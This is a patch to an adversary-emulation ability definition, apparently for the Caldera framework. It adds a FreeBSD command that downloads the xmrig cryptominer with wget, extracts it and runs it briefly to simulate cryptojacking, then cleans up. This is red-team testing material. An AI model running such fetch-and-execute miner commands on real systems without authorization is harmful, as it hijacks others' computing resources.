@@ -1,0 +1,22 @@
+--- plugins/stockpile/data/abilities/impact/46da2385-cf37-49cb-ba4b-a739c7a19de4.yml.orig	2022-09-14 02:24:22 UTC
++++ plugins/stockpile/data/abilities/impact/46da2385-cf37-49cb-ba4b-a739c7a19de4.yml
+@@ -19,6 +19,19 @@
+         cleanup: |
+           rm -rf ./xmrig*;
+         timeout: 120
++    freebsd:
++      sh:
++        # FreeBSD should include `timeout` making this easy.
++        # We expect timeout to return a 124, which needs to then return a 0
++        # to make Caldera UI happy.
++        command: |
++          wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-freebsd-static-x64.tar.gz;
++          tar -xf xmrig-6.19.2-freebsd-static-x64.tar.gz;
++          timeout 60 ./xmrig-6.19.2/xmrig;
++          [ $? -eq 124 ]
++        cleanup: |
++          rm -rf ./xmrig*;
++        timeout: 120
+     darwin:
+       sh:
+         # MacOS does not include timeout, but can mimic the process with screen.
